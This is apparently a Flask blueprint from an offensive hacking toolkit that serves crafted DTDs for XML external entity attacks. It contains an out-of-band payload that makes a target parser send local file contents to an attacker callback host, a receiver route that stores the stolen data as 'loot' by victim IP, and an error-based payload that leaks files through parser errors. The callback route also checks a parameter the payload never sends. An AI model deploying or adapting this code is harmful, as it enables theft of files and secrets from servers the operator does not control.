from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
import calendar
import datetime

xxe_bp = Blueprint('xxe_bp', __name__,
                    template_folder='html',
                    static_folder='static')

@xxe_bp.route("/xxe/yolo.dtd", methods=["GET"])
def oob():
    callback = ''
    if request.args.get('request'):
        if request.args.get('callback'):
            callback = request.args.get('callback')

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('request') + '"><!ENTITY % eval "<!ENTITY &#x25; yolo SYSTEM \'' + callback + '/xxe/froufrou?naam='+request.args.get('request').replace('.','').replace('/','_')+'&hatseflats=%ext;\'>">%eval;%yolo;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxe_bp.route("/xxe/froufrou", methods=["GET"])
def froufrou():
    if request.args.get('request'):
        ip = request.remote_addr
        data = request.args.get('hatseflats')

        if not os.path.exists(os.path.join('raw', 'loot', ip, 'xxe')):
            os.makedirs(f"raw/loot/{ip}/xxe")


        if request.args.get('naam'):
            naam = request.args.get('naam').replace('.','').replace('/','_')
            schrijven(f"raw/loot/{ip}/xxe/{naam}.txt", data)
        else:    
            date = datetime.datetime.utcnow()
            tijdstip = calendar.timegm(date.utctimetuple())
            schrijven(f"raw/loot/{ip}/xxe/{tijdstip}_xxe.txt", data)

        return '[!] Tot ziens en bedankt voor de Vis'
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")


@xxe_bp.route("/xxe/fout.dtd", methods=["GET"])
def error():
    if request.args.get('resource'):
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
